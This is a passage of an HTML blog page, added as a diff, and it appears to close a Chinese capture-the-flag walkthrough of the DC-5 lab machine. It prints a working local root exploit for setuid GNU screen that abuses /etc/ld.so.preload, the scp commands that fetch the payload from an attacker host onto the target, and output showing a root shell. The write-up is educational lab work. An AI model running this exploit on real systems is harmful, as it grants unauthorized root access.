+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">"\x0a/tmp/libhax.so"</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>我们用 scp 拷贝到靶机里去</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">scp root@192.168.0.21:/tmp/libhax.so /tmp</span><br><span class="line"><span class="comment">#然后输入kali的密码</span></span><br><span class="line">scp root@192.168.0.21:/tmp/rootshell /tmp</span><br><span class="line"><span class="comment">#然后输入kali的密码</span></span><br><span class="line">scp root@192.168.0.21:/tmp/run.sh /tmp</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后依次执行下面的语句或者写成shell脚本</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">"\x0a/tmp/libhax.so"</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>给他个执行权限并运行 <code>cd /tmp;chmod +x run.sh;./run.sh</code></p>
+</li>
+<li><p>就可以得到一个<code>rootshell</code>了:</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-5:~$ <span class="built_in">cd</span> /tmp;chmod +x run.sh;./run.sh</span><br><span class="line"><span class="built_in">cd</span> /tmp;chmod +x run.sh;./run.sh</span><br><span class="line">[+] Triggering...</span><br><span class="line"><span class="string">' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></span><br><span class="line"><span class="string">[+] done!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>flag 就在<code>/root</code>下的<code>thisistheflag.txt</code>文件</li>
+</ul>
+<h2><span id="theend"><strong>THEEND!</strong></span></h2>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 网络渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/DC-6/" rel="prev" title="DC-6 靶机渗透">
+      <i class="fa fa-chevron-left"></i> DC-6 靶机渗透
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/DC-4/" rel="next" title="DC-4 靶机渗透">
+      DC-4 靶机渗透 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#"><span class="nav-text">DC-5 靶机渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-text">1.渗透过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-text">THEEND!</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Rex_Surprise"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Rex_Surprise</p>
+  <div class="site-description" itemprop="description">Rex_Surprise的个人博客~</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/rexSurprise" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;rexSurprise" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_44911239" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_44911239" rel="noopener" target="_blank"><i class="fab fa-stack-overflow fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://fanyi.baidu.com/" title="http:&#x2F;&#x2F;fanyi.baidu.com" rel="noopener" target="_blank">百度翻译</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://39.97.126.84/" title="http:&#x2F;&#x2F;39.97.126.84" rel="noopener" target="_blank">我的小站</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Rex_Surprise</span>
+    <span class="post-meta-divider"><br/></span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">11k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">10 分钟</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+	  <span>本站访问人数:</span>
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+		<span>本站访问次数:</span>
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="400" alpha="0.25" zIndex="-1" src="//cdn.jsdelivr.net/gh/theme-next/theme-next-canvas-ribbon@1/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/lozad.js/1.14.0/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '5lI8es3hCNbfGw1bfoVdtl4Y-gzGzoHsz',
+      appKey     : 'RB9CwHU5LBvHFAGzGa8M8fcO',
+      placeholder: "谈谈你的看法(支持Markdown)",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '8' || 10,
+      visitor    : true,
+      lang       : 'zh-CN' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
